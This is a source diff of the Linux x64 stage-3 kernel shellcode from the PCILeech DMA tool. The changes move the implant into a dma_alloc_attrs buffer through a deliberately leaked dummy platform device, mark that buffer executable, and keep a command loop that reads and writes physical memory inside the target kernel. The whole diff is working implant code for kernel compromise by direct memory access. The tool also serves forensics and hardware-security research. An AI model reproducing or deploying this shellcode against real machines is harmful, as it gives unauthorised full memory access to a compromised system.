@@ -1,21 +1,21 @@
 // lx64_stage3_c.c : stage3 main shellcode.
 // Compatible with Linux x64.
 //
-// (c) Ulf Frisk, 2016, 2017
+// (c) Ulf Frisk, 2016-2024
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 
-typedef void					VOID, *PVOID;
-typedef int						BOOL, *PBOOL;
-typedef unsigned char			BYTE, *PBYTE;
-typedef char					CHAR, *PCHAR;
-typedef unsigned short			WORD, *PWORD;
-typedef unsigned long			DWORD, *PDWORD;
-typedef unsigned __int64		QWORD, *PQWORD;
-typedef void					*HANDLE;
-#define MAX_PATH				260
-#define TRUE					1
-#define FALSE					0
+typedef void                    VOID, *PVOID;
+typedef int                     BOOL, *PBOOL;
+typedef unsigned char           BYTE, *PBYTE;
+typedef char                    CHAR, *PCHAR;
+typedef unsigned short          WORD, *PWORD;
+typedef unsigned long           DWORD, *PDWORD;
+typedef unsigned __int64        QWORD, *PQWORD;
+typedef void                    *HANDLE;
+#define MAX_PATH                260
+#define TRUE                    1
+#define FALSE                   0
 
 extern QWORD SysVCall(QWORD fn, ...);
 extern QWORD LookupFunctions(QWORD qwAddr_KallsymsLookupName, QWORD qwAddr_FNLX);
@@ -28,17 +28,17 @@ extern VOID CacheFlush();
 #define LOOKUP_FUNCTION(pk, szFn) (SysVCall(pk->AddrKallsymsLookupName, szFn))
 
 typedef struct _PHYSICAL_MEMORY_RANGE {
-	QWORD BaseAddress;
-	QWORD NumberOfBytes;
+    QWORD BaseAddress;
+    QWORD NumberOfBytes;
 } PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;
 
 typedef struct _TIMEVAL {
-	QWORD tv_sec;
-	QWORD tv_usec;
+    QWORD tv_sec;
+    QWORD tv_usec;
 } TIMEVAL, *PTIMEVAL;
 
 typedef struct tdFNLX { // VOID definitions for LINUX functions (used in main control program)
-	QWORD msleep;
+    QWORD msleep;
 	QWORD alloc_pages_current;
 	QWORD set_memory_x;
 	QWORD __free_pages;
@@ -48,8 +48,8 @@ typedef struct tdFNLX { // VOID definitions for LINUX functions (used in main co
 	QWORD walk_system_ram_range;
 	QWORD iounmap;
 	QWORD ioremap;
-    // optional values below - do not use
-    QWORD ktime_get_real_ts64;      // do_gettimeofday alternative if export is missing.
+	// optional values below - do not use
+	QWORD ktime_get_real_ts64;      // do_gettimeofday alternative if export is missing.
 	QWORD _ioremap_nocache;
 	QWORD getnstimeofday64;			// do_gettimeofday alternative if export is missing.
 	QWORD alloc_pages;
@@ -57,10 +57,17 @@ typedef struct tdFNLX { // VOID definitions for LINUX functions (used in main co
 	QWORD set_memory_rox;			// 6.4+ kernels
 	QWORD set_memory_rw;			// 6.4+ kernels
 	QWORD _wincall_asm_callback;	// linux ksh-module specific callback address (settable by ksh module). [offset: 0x88 / 0x388]
-	QWORD ReservedFutureUse[14];
+	QWORD dma_free_attrs;
+	QWORD platform_device_alloc;
+	QWORD platform_device_add;
+	QWORD platform_device_put;
+	QWORD dma_alloc_attrs;
+	QWORD memset;
+	QWORD ReservedFutureUse[8];
 } FNLX, *PFNLX;
 
-#define KMDDATA_OPERATING_SYSTEM_LINUX			0x02
+#define KMDDATA_OPERATING_SYSTEM_LINUX          0x02
+#define KMDDATA_OPERATING_SYSTEM_MIGRATE        0xffffffff00000000
 
 /*
 * KMD DATA struct. This struct must be contained in a 4096 byte section (page).
@@ -101,6 +108,13 @@ typedef struct tdKMDDATA {
 	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
 } KMDDATA, *PKMDDATA;
 
+// ReservedKMD MAP:
+// [0] = task_struct*
+// [1] = page* (2-page alloc, if exists)
+// [2] = is_migrated (0: no, 1: yes)
+// [3] = page* (large buffer, if exists)
+// [4] = platform_device* (large buffer, if exists)
+
 #define KMD_CMD_VOID			0xffff
 #define KMD_CMD_COMPLETED		0
 #define KMD_CMD_READ			1
@@ -112,57 +126,8 @@ typedef struct tdKMDDATA {
 #define KMD_CMD_WRITE_VA		7
 
 /*
-* Tries to allocate 4MB contigious memory. If not possible 2MB will be tried.
-* If not possible -> fail.
-* -- pk
-* -- fRetry = should be set to TRUE on entry to enable retry on fail.
-* -- return = ptr to struct page if successful.
+* Lookup functions in kallsyms_lookup_name.
 */
-QWORD AllocateMemoryDma(PKMDDATA pk, BOOL fRetry)
-{
-	QWORD i, pStructPages[3], pa[2];
-	for(i = 0; i < 2; i++) {
-		pStructPages[i] = SysVCall(pk->fn.alloc_pages_current, 0x14, 10);
-		pa[i] = pStructPages[i] ? m_page_to_phys(pk->AddrKallsymsLookupName, pStructPages[i]) : 0;
-	}
-	// success
-	if(pa[0] == pa[1] + 0x200000) {
-		pk->DMASizeBuffer = 0x400000;
-		pk->DMAAddrPhysical = pa[1];
-		return pStructPages[1];
-	}
-	// complete fail
-	if(!pa[0] && !pa[1]) {
-		return 0;
-	}
-	// if 2nd attempt - fail if not complete success
-	if(!fRetry) {
-		for(i = 0; i < 2; i++) {
-			if(pStructPages[i]) {
-				SysVCall(pk->fn.__free_pages, pStructPages[i], 10);
-			}
-		}
-		return 0;
-	}
-	// retry for possible complete success
-	pStructPages[2] = AllocateMemoryDma(pk, FALSE);
-	if(pStructPages[2]) {
-		for(i = 0; i < 2; i++) {
-			if(pStructPages[i]) {
-				SysVCall(pk->fn.__free_pages, pStructPages[i], 10);
-			}
-		}
-		return pStructPages[2];
-	}
-	// partial success
-	if(pStructPages[1]) {
-		SysVCall(pk->fn.__free_pages, pStructPages[1], 10);
-	}
-	pk->DMASizeBuffer = 0x200000;
-	pk->DMAAddrPhysical = pa[0];
-	return pStructPages[0];
-}
-
 BOOL LookupFunctionsEx(PKMDDATA pk)
 {
     DWORD i;
@@ -182,6 +147,226 @@ BOOL LookupFunctionsEx(PKMDDATA pk)
     return TRUE;
 }
 
+/*
+* Free a struct page* buffer.
+*/
+VOID FreePageBuffer(PKMDDATA pk, QWORD pg, QWORD order)
+{
+	QWORD pa, va, cb;
+	if(!pg) {
+		return;
+	}
+	pa = m_page_to_phys(pk->AddrKallsymsLookupName, pg);
+	if(!pa) {
+		return;
+	}
+	va = m_phys_to_virt(pk->AddrKallsymsLookupName, pa);
+	if(!va) {
+		return;
+	}
+	if(pk->fn.memset) {
+        cb = (1ULL << order) << 12;
+		if(pk->fn.set_memory_rox && pk->fn.set_memory_rw && pk->fn.set_memory_nx) {
+			// W^X
+			SysVCall(pk->fn.set_memory_nx, va, cb);
+		}
+		if(pk->fn.set_memory_rw) {
+			SysVCall(pk->fn.set_memory_rw, va, cb);
+		}
+		SysVCall(pk->fn.memset, va, 0, cb);
+	}
+	SysVCall(pk->fn.__free_pages, pg, order);
+}
+
+/*
+* Free DMA buffer previously allocated with AllocateDmaLargeBuffer (if exists)
+*/
+VOID FreeDmaLargeBuffer(PKMDDATA pk)
+{
+    QWORD p_platdev = pk->ReservedKMD[4];
+	pk->ReservedKMD[4] = 0;
+	if(pk->fn.dma_free_attrs && p_platdev) {
+		SysVCall(pk->fn.dma_free_attrs, p_platdev + 0x10, pk->DMASizeBuffer, pk->DMAAddrVirtual, pk->DMAAddrPhysical, 0);
+        if(pk->fn.platform_device_put) {
+            SysVCall(pk->fn.platform_device_put, p_platdev);
+        }
+	}
+}
+
+/*
+* Tries to allocate 2MB contigious DMA memory.
+*/
+QWORD AllocateDmaLargeBuffer(PKMDDATA pk)
+{
+	CHAR device[] = { 'd', 'e', 'v', 0 };
+	QWORD p_platdev, p_dev, vaDMA, paDMA;
+	if(!pk->fn.platform_device_alloc || !pk->fn.platform_device_add || !pk->fn.dma_alloc_attrs) {
+		return 0;
+	}
+	p_platdev = SysVCall(pk->fn.platform_device_alloc, device, (QWORD)-1);
+	if(!p_platdev) {
+		return 0;
+	}
+	//SysVCall(pk->fn.platform_device_add, p_platdev);
+	p_dev = p_platdev + 0x10;
+	vaDMA = SysVCall(pk->fn.dma_alloc_attrs, p_dev, 0x00200000, &paDMA, (QWORD)0xcc4, 0);
+	if(!vaDMA || !paDMA) {
+		return 0;
+	}
+	pk->DMASizeBuffer = 0x00200000;
+	pk->DMAAddrPhysical = paDMA;
+	pk->DMAAddrVirtual = vaDMA;
+	pk->ReservedKMD[4] = p_platdev;
+	return 1;
+}
+
+/*
+* Free DMA buffer previously allocated with AllocateDmaLargeBuffer (if exists)
+*/
+VOID FreePageLargeBuffer(PKMDDATA pk)
+{
+    QWORD pg = pk->ReservedKMD[3];
+	pk->ReservedKMD[3] = 0;
+    if(pg) {
+		FreePageBuffer(pk, pg, 9);
+	}
+}
+
+/*
+* Tries to allocate 2MB contigious memory using alloc_pages
+*/
+QWORD AllocatePageLargeBuffer(PKMDDATA pk)
+{
+	QWORD pg, pa, va;
+	pg = SysVCall(pk->fn.alloc_pages_current, 0xcc4, 9);
+	if(!pg) {
+		return 0;
+	}
+	pa = m_page_to_phys(pk->AddrKallsymsLookupName, pg);
+	if(!pa) {
+		return 0;
+	}
+    va = m_phys_to_virt(pk->AddrKallsymsLookupName, pa);
+	if(!va) {
+		return 0;
+	}
+	pk->DMASizeBuffer = 0x00200000;
+	pk->DMAAddrPhysical = pa;
+	pk->DMAAddrVirtual = va;
+	pk->ReservedKMD[3] = pg;
+	return 1;
+}
+
+/*
+* Free the large buffer irrespective of allocation type.
+*/
+VOID FreeLargeBuffer(PKMDDATA pk)
+{
+    FreeDmaLargeBuffer(pk);
+    FreePageLargeBuffer(pk);
+	pk->DMAAddrPhysical = 0;
+	pk->DMAAddrVirtual = 0;
+}
+
+/*
+* Allocate a large 2MB buffer for DMA operations using either dma_alloc_coherent or alloc_pages.
+*/
+QWORD AllocateLargeBuffer(PKMDDATA pk)
+{
+    return AllocateDmaLargeBuffer(pk) || AllocatePageLargeBuffer(pk);
+}
+
+
+
+// ------------------------------------------------------
+// TRY BUFFER MIGRATION FROM INITIAL 'alloc_pages' BUFFER
+// TO A NEW 'dma_alloc_coherent' BUFFER.
+// ------------------------------------------------------
+
+/*
+* Free the original 2-page buffer if execution is migrated.
+*/
+VOID TryMigrate_FreeOriginalBuffer(PKMDDATA pk)
+{
+	QWORD fMigrated, pg;
+    pg = pk->ReservedKMD[1];
+	pk->ReservedKMD[1] = 0;
+    fMigrated = pk->ReservedKMD[2];
+	if(pg && fMigrated) {
+		FreePageBuffer(pk, pg, 1);
+	}
+    
+}
+
+/*
+* Try to allocate DMA memory for the migrated main pcileech buffer
+* (KMDDATA + stage3 shellcode). A dummy platform device is allocated
+* (but not added) for this purpose. Leak the platform device allocation.
+*/
+QWORD TryMigrate_AllocateMemoryDmaSmall(PKMDDATA pk, QWORD *paDMA)
+{
+	CHAR device[] = { 'd', 'e', 'v', 0 };
+	QWORD p_platdev, p_dev, vaDMA;
+	if(!pk->fn.platform_device_alloc || !pk->fn.platform_device_add || !pk->fn.dma_alloc_attrs) {
+		return 0;
+	}
+	p_platdev = SysVCall(pk->fn.platform_device_alloc, device, (QWORD)-1);
+	if(!p_platdev) {
+		return 0;
+	}
+	//SysVCall(pk->fn.platform_device_add, p_platdev);
+	p_dev = p_platdev + 0x10;
+	vaDMA = SysVCall(pk->fn.dma_alloc_attrs, p_dev, 0x2000, paDMA, (QWORD)0xcc4, 0);
+	return vaDMA;
+}
+
+/*
+* Entry point for buffer migration to new more correct dma buffer.
+* If migration fail, the shellcode execution will continue in the old buffer.
+*/
+QWORD stage3_c_TryMigrateEntryPoint(PKMDDATA pk)
+{
+    QWORD o, vaDMA1 = 0, vaDMA2 = 0, paDMA2 = 0;
+	// 1: lookup functions:
+	if(!LookupFunctionsEx(pk)) {
+		return 0;
+	}
+    // 2: check if we can set memory rox/rw/nx - we can't migrate due to high risk of a bugcheck.
+	if(pk->fn.set_memory_rox && pk->fn.set_memory_rw && pk->fn.set_memory_nx) {
+
+		return 0;
+	}
+	// 3: allocate new 2-page dma buffer:
+    vaDMA2 = TryMigrate_AllocateMemoryDmaSmall(pk, &paDMA2);
+    if(!vaDMA2 || !paDMA2) {
+		return 0;
+    }
+    // 4: copy data from old buffer to new buffer:
+	vaDMA1 = (QWORD)pk;
+    for(o = 0; o < 0x2000; o += 8) {
+        *(PQWORD)(vaDMA2 + o) = *(PQWORD)(vaDMA1 + o);
+    }
+	// 5: set new buffer (+0x1000) as executable:
+    if(pk->fn.set_memory_rox && pk->fn.set_memory_rw && pk->fn.set_memory_nx) {
+		// W^X
+        SysVCall(pk->fn.set_memory_rox, vaDMA2 + 0x1000, 1);
+	} else {
+		SysVCall(pk->fn.set_memory_x, vaDMA2 + 0x1000, 1);
+	}
+	// 6: return to let the shellcode continue migration:
+	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_MIGRATE | paDMA2;
+	pk->MAGIC = 0x0ff11337711333377;
+	pk->_status = 0xf0000001;
+	pk->_op = KMD_CMD_COMPLETED;
+	return (vaDMA2 - vaDMA1);
+}
+
+
+
+// ------------------------------------------------------
+// MAIN EXECUTION LOOP BELOW:
+// ------------------------------------------------------
+
 // status:
 //     1: ready for command
 //     2: processing
@@ -198,9 +383,9 @@ BOOL LookupFunctionsEx(PKMDDATA pk)
 VOID stage3_c_EntryPoint(PKMDDATA pk)
 {
 	BOOL fROX;
-	QWORD pStructPages, qwMM, qw;
+	QWORD qwMM, qw;
 	TIMEVAL timeLast, timeCurrent;
-	// 0: set up symbols and kmd data
+	// 1: set up symbols and kmd data
 	pk->MAGIC = 0x0ff11337711333377;
 	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_LINUX;
 	if(!LookupFunctionsEx(pk)) {
@@ -208,16 +393,15 @@ VOID stage3_c_EntryPoint(PKMDDATA pk)
 		return;
 	}
 	fROX = pk->fn.set_memory_rox && pk->fn.set_memory_rw && pk->fn.set_memory_nx;
-	// 1: allocate memory
-	if(0 == (pStructPages = AllocateMemoryDma(pk, TRUE))) {
+	// 2: allocate memory
+	if(!AllocateLargeBuffer(pk)) {
 		pk->_status = 0xf0000002;
 		return;
 	}
-	pk->DMAAddrVirtual = m_phys_to_virt(pk->AddrKallsymsLookupName, pk->DMAAddrPhysical);
 	if(!fROX) {
 		SysVCall(pk->fn.set_memory_x, pk->DMAAddrVirtual, pk->DMASizeBuffer / 4096);
 	}
-	// 2: main dump loop
+	// 3: main dump loop
 	SysVCall(pk->fn.do_gettimeofday, &timeLast);
 	while(TRUE) {
 		pk->_status = 1;
@@ -232,15 +416,19 @@ VOID stage3_c_EntryPoint(PKMDDATA pk)
 		pk->_status = 2;
 		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
 			pk->_status = 0xf0000000;
-			SysVCall(pk->fn.__free_pages, pStructPages, 10);
-			pk->DMAAddrPhysical = 0;
-			pk->DMAAddrVirtual = 0;
+			FreeLargeBuffer(pk);
 			pk->_result = TRUE;
 			pk->MAGIC = 0;
 			pk->_op = KMD_CMD_COMPLETED;
 			return;
 		}
 		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
+			// mem info is usually called upon initialization,
+			// in the case of a buffer migration we piggy-back
+			// to clean up the old allocation here.
+            if(pk->ReservedKMD[1] && pk->ReservedKMD[2]) {
+                TryMigrate_FreeOriginalBuffer(pk);
+            }
 			if(pk->fn.walk_system_ram_range) {
 				pk->_size = 0;
 				pk->_result = (0 == SysVCall(pk->fn.walk_system_ram_range, 0, ~0UL, pk, callback_walk_system_ram_range));
